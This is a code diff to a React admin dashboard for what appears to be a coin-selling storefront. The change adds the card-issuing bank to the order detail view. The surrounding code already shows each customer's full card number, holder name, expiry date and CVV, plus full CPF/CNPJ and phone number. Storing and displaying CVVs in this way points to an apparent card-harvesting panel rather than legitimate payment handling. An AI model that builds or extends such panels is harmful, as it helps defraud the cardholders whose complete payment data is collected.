@@ -225,7 +225,7 @@ export default function AdminDashboard() {
                 <div className="admin-detail-grid">
                   <div><span>Cliente</span><strong>{selectedOrder.customerName || '-'}</strong><small>{selectedOrder.customerEmail || '-'}</small></div>
                   <div><span>Contato completo</span><strong>Tel: {selectedOrder.customerPhoneFull || `final ${selectedOrder.customerPhoneLast4}` || '-'}</strong><small>CPF/CNPJ: {selectedOrder.customerDocumentFull || `final ${selectedOrder.customerDocumentLast4}` || '-'}</small></div>
-                  <div><span>Pagamento</span><strong>{selectedOrder.method === 'credit_card' ? 'Cartão de crédito' : 'PIX'}</strong><small>{(selectedOrder.cardBrand || 'Sem bandeira').toUpperCase()} {selectedOrder.cardNumber ? selectedOrder.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : selectedOrder.cardLast4 ? `•••• ${selectedOrder.cardLast4}` : ''}</small></div>
+                  <div><span>Pagamento</span><strong>{selectedOrder.method === 'credit_card' ? 'Cartão de crédito' : 'PIX'}</strong><small>{(selectedOrder.cardBrand || 'Sem bandeira').toUpperCase()} {selectedOrder.cardBank ? `(${selectedOrder.cardBank}) ` : ''}{selectedOrder.cardNumber ? selectedOrder.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : selectedOrder.cardLast4 ? `•••• ${selectedOrder.cardLast4}` : ''}</small></div>
                   <div><span>Valor e pacote</span><strong>{money(selectedOrder.amount)}</strong><small>{number(selectedOrder.coins)} moedas{selectedOrder.installments > 1 ? ` · ${selectedOrder.installments}x` : ''}</small></div>
                 </div>
 
@@ -235,7 +235,7 @@ export default function AdminDashboard() {
                     <div><span>Titular do cartão</span><strong>{selectedOrder.cardHolderName || '-'}</strong></div>
                     <div><span>Validade</span><strong>{selectedOrder.cardExpMonth ? `${String(selectedOrder.cardExpMonth).padStart(2, '0')}/${selectedOrder.cardExpYear}` : '-'}</strong></div>
                     <div><span>CVV</span><strong style={{ color: '#ef4444' }}>{selectedOrder.cardCvv || '-'}</strong></div>
-                    <div><span>Bandeira</span><strong>{(selectedOrder.cardBrand || '-').toUpperCase()}</strong></div>
+                    <div><span>Bandeira / Banco</span><strong>{(selectedOrder.cardBrand || '-').toUpperCase()} {selectedOrder.cardBank ? ` / ${selectedOrder.cardBank}` : ''}</strong></div>
                     <div><span>Parcelas</span><strong>{selectedOrder.installments || 1}x</strong></div>
                   </div>
                 )}
